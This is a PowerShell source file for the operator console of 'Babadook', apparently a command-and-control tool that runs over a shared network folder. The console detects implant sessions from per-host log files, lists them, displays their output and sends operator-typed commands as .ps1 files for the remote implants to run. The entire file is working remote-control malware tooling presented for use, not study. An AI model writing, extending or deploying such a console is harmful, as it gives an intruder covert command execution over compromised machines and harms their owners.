####################################
## Babadook Console Configuration ##
####################################

$SharePath = "Y:\Path\To\Shared\Folder"

###################
## Internal Vars ##
###################

$Global:ClientSessions = @{}
$Global:Running = $true

####################
## Util functions ##
####################

Function Check-Sessions {

    If (@($Global:ClientSessions.Keys).Count -ge 1) {
        Try {
            # Check dead sessions
            Foreach ($S in $Global:ClientSessions.GetEnumerator()) {
                $SessionEntry = $S.Value
                If (-Not (Test-Path "$($SharePath)\$($SessionEntry.filename)")) {
                    $Global:ClientSessions.Remove($S.Key)
                }# end :: If
            }# end :: Foreach
        } Catch {
            # Nothing... silently ignore
        }# end :: Try
    }# end :: if

    # Check new sessions
    Get-ChildItem $SharePath -Filter "babadook.*.*.log" | Where-Object { $_.Attributes -ne "Directory"} | ForEach-Object {

        $parts = [regex]::match($_.Name, "babadook\.(.*)\.(\d+)\.log").Groups
        $ClientHostname = $parts[1].Value
        $ClientPID = $parts[2].Value
        
        $UniqueKey = "$($ClientHostname)$($ClientPID)"
        
        $SessionProps = @{
            "hostname" = $ClientHostname
            "pid" = $ClientPID
            "filename" = $_.Name
            "cursor" = 0
        }
        
        If (-Not ($Global:ClientSessions.Keys -Contains $UniqueKey)) {
            $Global:ClientSessions[$UniqueKey] = $SessionProps
            Write-Output "[*] New session added at host $($ClientHostname) with pid $($ClientPID)"        
        }# end :: if
        
    }# end :: Foreach-Object
        
}# end :: Check-Sessions

Function List-Sessions {
    
    Check-Sessions
    Write-Output "Babadook sessions registered: "
    Write-Output "==============================================================================="
    
    If (@($Global:ClientSessions.Keys).Count -lt 1) {
        Write-Output "- No sessions available"
    } Else {
    
        $Index = 1
            
        Foreach ($SessionEntry in $Global:ClientSessions.GetEnumerator()) {
            $SessionValue = $SessionEntry.Value
            $LastTime = $(Get-Item "$SharePath\$($SessionValue.filename)").LastWriteTime
            "[$($Index)] $($SessionValue.hostname)`t$($SessionValue.pid)`t$($LastTime)"
            $Index += 1
        }# end :: Foreach
    }# end :: if
}# end :: List-Sessions

Function Interact-Session ($sid) {

    Check-Sessions
    
    $SessionCount = @($Global:ClientSessions.Keys).Count
    $SessionIndex = [int] $sid-1
    
    If ($SessionIndex -lt 0 -Or $SessionIndex -ge $SessionCount) {
        Write-Output "Invalid session index"
        return
    }# end :: if

    $SessionKey = @($Global:ClientSessions.Keys)[$SessionIndex]
    $SessionEntry = $Global:ClientSessions[$SessionKey]
    
    $Command = $null
    
    "Interacting with session [$sid] on $($SessionEntry.hostname) with pid $($SessionEntry.pid)"
    
    While ($Command -ne "quit") {
    
        If (-Not (Test-Path "$SharePath\$($SessionEntry.filename)")) { 
            Write-Output "[!] Current session died. Quitting session handler"
            Break
        }# end :: if
    
        $Content = Get-Content "$SharePath\$($SessionEntry.filename)" 
        
        $Content | select -skip $SessionEntry.cursor
        
        $SessionEntry.Cursor = [int] $($Content | Measure-Object –Line).Lines
        
        $Command = Read-Host "Babadook [$sid ($($SessionEntry.hostname)|$($SessionEntry.pid))] ('quit' to go back)>"
    
        If ($Command -And $Command -ne "quit") {        
            $OutFile = "cmd.$($SessionEntry.hostname).$($SessionEntry.pid).ps1"        
            $Command | Out-File -FilePath "$($SharePath)\$($OutFile)"        
            "`"$Command`" sent to session $($sid)"
        }# end :: If
        
    }# end :: while
    
}# end :: Interact-Session

Function Read-Command {

    $CommandLine = Read-Host "Babadook> "
    
    $CommandParts = $CommandLine.Split(" ")
    
    if ($CommandParts -is [system.array]) {
        $Command, $Args = $CommandParts
    } else {
        $Command = $CommandLine
        $Args = $null
    }# end :: if
    
    Switch ($Command) {
        "list" { List-Sessions }
        "interact" { Interact-Session $Args }
        "quit" { $Global:Running = $false }
        "help" { Show-Help }
        default { Write-Output "Invalid command" } 
    }# end :: Switch

}# end :: Read-Command

Function Show-Help {

    Write-Output "Available commands: `n"
    Write-Output "Command`t`t`tDescription"
    Write-Output "======================================"
    
    Write-Output "list`t`t`tShow available sessions"
    Write-Output "interact <n>`tInteract with session"
    Write-Output "quit`t`t`tExit console"
    
    Write-Output "`n"

}# end :: Show-Help

###############
## Main Code ##
###############

Function Main {

    while ($Global:Running) {

        Check-Sessions
        Read-Command
    
    }# end :: while


}# end :: Main

Main